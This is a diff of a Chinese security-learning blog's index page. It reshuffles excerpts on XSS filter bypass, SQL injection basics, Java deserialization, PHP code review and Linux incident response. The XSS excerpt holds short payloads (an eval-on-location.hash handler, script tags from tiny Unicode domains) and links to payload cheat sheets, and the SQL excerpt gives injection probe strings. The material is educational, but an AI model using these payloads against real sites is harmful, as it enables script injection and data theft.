@@ -196,152 +196,6 @@ document.getElementById("qrcode-nav").hidden=true
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/sub-domains/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="狗头君师">
-      <meta itemprop="description" content="技术烂大街，经验诚可贵">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/20230327/penetration-testing-guide/sub-domains/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>amss</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/xss-bypass/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="狗头君师">
-      <meta itemprop="description" content="技术烂大街，经验诚可贵">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/20230327/penetration-testing-guide/xss-bypass/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="绕过"><a class="header-anchor" href="#绕过">¶</a>绕过</h2>
-<p>触发xss时遇到有防御措施网站时需要反复调试payload，那么多语法肯定不好记，下面给大家几个网站，里面包含了几乎所有xss语句的备忘录：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">burpsuite官方</a></li>
-<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">owasp官方</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/payloadbox/xss-payload-list">xss-payload-list</a></li>
-</ul>
-<p>**注意：*部分payload是依赖浏览器版本的，例如在<code>火狐浏览器</code>触发可能在<code>谷歌浏览器</code>未必可以使用，burpsuite官方的备忘录有测试功能，大家多尝试一下。</p>
-<p><strong>突破HTML实体编码</strong></p>
-<ul>
-<li>尖括号过滤绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l8">实验</a></li>
-<li>引号绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l9">实验</a></li>
-<li>大小写绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l10">实验</a></li>
-<li>编码变形绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l11">实验</a></li>
-</ul>
-<p><strong>突破长度限制</strong></p>
-<ul>
-<li>
-<p>精简payload👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l11">实验</a><br>
-在url中，<code>#</code>后内容不会发送给服务器，利用这个特性可以达到突破长度限制并且隐藏攻击双重目的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=&quot;eval(location.hash.substr(1))&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>短域名👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l12">实验</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//Ⅻ.₨&gt;</span><br><span class="line">&lt;script src=//⑭.₨&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><strong>更多绕过技巧集合：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/244524.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/93192936</span><br><span class="line">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</span><br><span class="line">https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</span><br><span class="line">https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition</span><br><span class="line">https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code</span><br><span class="line">https://medium.com/taptuit/minifying-xss-f17d7dc241cf</span><br><span class="line">https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss</span><br><span class="line">https://www.acunetix.com/websitesecurity/cross-site-scripting/</span><br></pre></td></tr></table></figure>
-<p><strong>XSS盲打平台</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xsshunter.com/</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/code-review/java-deserialization2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -356,7 +210,7 @@ document.getElementById("qrcode-nav").hidden=true
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/20230327/code-review/java-deserialization2/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/20230327/code-review/java-deserialization2/" class="post-title-link" itemprop="url">Java安全 反序列化(二)</a>
         </h2>
 
         <div class="post-meta">
@@ -365,8 +219,22 @@ document.getElementById("qrcode-nav").hidden=true
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
+              <time title="Created: 2023-03-27 10:16:00 / Modified: 10:05:45" itemprop="dateCreated datePublished" datetime="2023-03-27T10:16:00+08:00">2023-03-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">反序列化</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JAVA/" itemprop="url" rel="index"><span itemprop="name">JAVA</span></a>
+                </span>
             </span>
 
           
@@ -380,8 +248,7 @@ document.getElementById("qrcode-nav").hidden=true
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1>java安全 反序列化(二)</h1>
-<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+          <h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
 <p>寻找反序列化链(Gadget)</p>
 <ol>
 <li>
@@ -535,7 +402,7 @@ document.getElementById("qrcode-nav").hidden=true
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/20230327/code-review/php-code-review/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/20230327/code-review/php-code-review/" class="post-title-link" itemprop="url">PHP代码审计</a>
         </h2>
 
         <div class="post-meta">
@@ -544,8 +411,18 @@ document.getElementById("qrcode-nav").hidden=true
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
+              <time title="Created: 2023-03-27 10:16:00 / Modified: 10:05:45" itemprop="dateCreated datePublished" datetime="2023-03-27T10:16:00+08:00">2023-03-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
             </span>
 
           
@@ -1009,6 +886,277 @@ if(!get_magic_quotes_gpc())，查看下函数意思<br>
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="狗头君师">
+      <meta itemprop="description" content="技术烂大街，经验诚可贵">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-03-27 10:05:45" itemprop="dateCreated datePublished" datetime="2023-03-27T10:05:45+08:00">2023-03-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1><center>网络安全应急响应手册</center></h1>
+<h2><center>Linux 篇</center></h2>
+<p><img src="https://static.sechelper.com/img/qrcode/qrcode-group-01.png" alt="qrcode"></p>
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;作者：坤哥@助安社区</h3></center>
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;版本：v1.0.4</h3>
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发布时间：2023/03/21</h3>
+<div STYLE="page-break-after: always;"></div>
+<p><em>网络安全应急响应手册-Linux篇</em>是<strong>助安社区</strong>原创的应急干货合集，后续还会继续更新<em>网络安全应急响应手册-Windows篇</em>等系列。此系列文章对应b站视频观看效果更佳。扫码加入助安社区交流群，社区内部红队沙龙、资源共享和大厂工作经验。真正<strong>热爱安全</strong>和喜欢<strong>技术交流</strong>的小伙伴欢迎加入我们。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1FG4y1Y7UQ</span><br></pre></td></tr></table></figure>
+<p>应急响应指遇到重大或突发事件后所采取的措施和行动。应急响应所处置的突发事件不仅仅包括硬件、产品、网络、配置等方面的故障，也包括各类安全事件，如：黑客攻击、木马病毒、勒索病毒、Web攻击等。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/xss-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="狗头君师">
+      <meta itemprop="description" content="技术烂大街，经验诚可贵">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/20230327/penetration-testing-guide/xss-bypass/" class="post-title-link" itemprop="url">xss Bypass</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-03-27 09:53:00 / Modified: 10:05:45" itemprop="dateCreated datePublished" datetime="2023-03-27T09:53:00+08:00">2023-03-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/" itemprop="url" rel="index"><span itemprop="name">XSS</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/%E7%BB%95%E8%BF%87/" itemprop="url" rel="index"><span itemprop="name">绕过</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="绕过"><a class="header-anchor" href="#绕过">¶</a>绕过</h2>
+<p>触发xss时遇到有防御措施网站时需要反复调试payload，那么多语法肯定不好记，下面给大家几个网站，里面包含了几乎所有xss语句的备忘录：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">burpsuite官方</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">owasp官方</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/payloadbox/xss-payload-list">xss-payload-list</a></li>
+</ul>
+<p>**注意：*部分payload是依赖浏览器版本的，例如在<code>火狐浏览器</code>触发可能在<code>谷歌浏览器</code>未必可以使用，burpsuite官方的备忘录有测试功能，大家多尝试一下。</p>
+<!--morr-->
+<p><strong>突破HTML实体编码</strong></p>
+<ul>
+<li>尖括号过滤绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l8">实验</a></li>
+<li>引号绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l9">实验</a></li>
+<li>大小写绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l10">实验</a></li>
+<li>编码变形绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l11">实验</a></li>
+</ul>
+<p><strong>突破长度限制</strong></p>
+<ul>
+<li>
+<p>精简payload👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l11">实验</a><br>
+在url中，<code>#</code>后内容不会发送给服务器，利用这个特性可以达到突破长度限制并且隐藏攻击双重目的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=&quot;eval(location.hash.substr(1))&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>短域名👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l12">实验</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//Ⅻ.₨&gt;</span><br><span class="line">&lt;script src=//⑭.₨&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>更多绕过技巧集合：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/244524.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/93192936</span><br><span class="line">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</span><br><span class="line">https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</span><br><span class="line">https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition</span><br><span class="line">https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code</span><br><span class="line">https://medium.com/taptuit/minifying-xss-f17d7dc241cf</span><br><span class="line">https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss</span><br><span class="line">https://www.acunetix.com/websitesecurity/cross-site-scripting/</span><br></pre></td></tr></table></figure>
+<p><strong>XSS盲打平台</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xsshunter.com/</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/sql-inject-principle/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="狗头君师">
+      <meta itemprop="description" content="技术烂大街，经验诚可贵">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/20230327/penetration-testing-guide/sql-inject-principle/" class="post-title-link" itemprop="url">SQL注入的本质</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-03-27 09:53:00 / Modified: 10:05:45" itemprop="dateCreated datePublished" datetime="2023-03-27T09:53:00+08:00">2023-03-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87/" itemprop="url" rel="index"><span itemprop="name">绕过</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="SQL注入的本质"><a class="header-anchor" href="#SQL注入的本质">¶</a>SQL注入的本质</h2>
+<p>注入攻击的<em>本质: 把用户输入的数据当做代码执行</em>。</p>
+<p><strong>两个关键条件：</strong></p>
+<ol>
+<li>
+<p>用户能够控制输入</p>
+</li>
+<li>
+<p>原本程序要执行的代码，拼接用户输入数据被执行</p>
+</li>
+</ol>
+<h2 id="手工测试"><a class="header-anchor" href="#手工测试">¶</a>手工测试</h2>
+<p>但很多时候，Web服务器关闭了错误回显，这时候我们该怎样实行SQL注入了呢？</p>
+<h3 id="判断是否存在注入"><a class="header-anchor" href="#判断是否存在注入">¶</a>判断是否存在注入</h3>
+<p>二话不说，先加单引号’、双引号”、单括号)、双括号)）等看看是否报错，如果报错就可能存在<code>SQL</code>注入漏洞了。<br>
+还有在URL后面加and 1=1,and 1=2看页面是否显示一样，显示不一样的话，在判断是字符型还是数字型，肯定存在SQL注入漏洞了。还有就是<code>Timing Attack</code>测试，也就是时间盲注。有时候通过简单的条件语句比如<code>and 1=2</code>是无法看出异常的。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/20230327/penetration-testing-guide/sql-inject-principle/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/ctf/volatility%E5%8F%96%E8%AF%81/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1150,199 +1298,6 @@ if(!get_magic_quotes_gpc())，查看下函数意思<br>
 <p><img src="https://static.sechelper.com/img/2022/11/26/1f46b9ec8a15824590ee3818866b13ec.png" alt="img"></p>
 <p><img src="https://static.sechelper.com/img/2022/11/26/19ff35dbd3b090b2b8895bafe35629cc.png" alt="img"></p>
 <p>或者使用反编译查看图片</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA-v1.0.3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="狗头君师">
-      <meta itemprop="description" content="技术烂大街，经验诚可贵">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA-v1.0.3/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1><center>网络安全应急响应手册</center></h1>
-<h2><center>Linux 系列</center></h2>
-<p><img src="https://static.sechelper.com/img/qrcode/qrcode-group-01.png" alt="qrcode"></p>
-<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;作者：君师@助安社区</h3></center>
-<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;版本：v1.0.3</h3>
-<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发布时间：2022/12/07</h3>
-<div STYLE="page-break-after: always;"></div>
-<p><em>网络安全应急响应手册-Linux篇</em>是<strong>助安社区</strong>原创的应急干货合集，后续还会继续更新<em>网络安全应急响应手册-Windows篇</em>等系列。此系列文章对应b站视频观看效果更佳。扫码加入助安社区交流群，社区内部红队沙龙、资源共享和大厂工作经验。真正<strong>热爱安全</strong>和喜欢<strong>技术交流</strong>的小伙伴欢迎加入我们。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1FG4y1Y7UQ</span><br></pre></td></tr></table></figure>
-<p>应急响应指遇到重大或突发事件后所采取的措施和行动。应急响应所处置的突发事件不仅仅包括硬件、产品、网络、配置等方面的故障，也包括各类安全事件，如：黑客攻击、木马病毒、勒索病毒、Web攻击等。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA-v1.0.3/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="狗头君师">
-      <meta itemprop="description" content="技术烂大街，经验诚可贵">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/20230327/penetration-testing-guide/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
